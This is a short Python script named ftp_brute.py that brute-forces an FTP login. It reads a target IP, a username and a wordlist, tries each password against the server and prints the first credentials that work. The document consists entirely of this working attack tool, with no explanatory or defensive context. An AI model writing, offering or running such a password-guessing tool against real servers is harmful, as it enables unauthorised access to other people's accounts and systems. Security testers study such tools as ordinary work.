# ftp_brute.py
from ftplib import FTP

target = input("FTP IP: ")
user = input("Username: ")
wordlist = input("Wordlist path: ")

with open(wordlist, 'r') as f:
    for line in f:
        password = line.strip()
        try:
            ftp = FTP(target)
            ftp.login(user, password)
            print(f"[+] Success: {user}:{password}")
            ftp.quit()
            break
        except:
            print(f"[-] Failed: {password}")
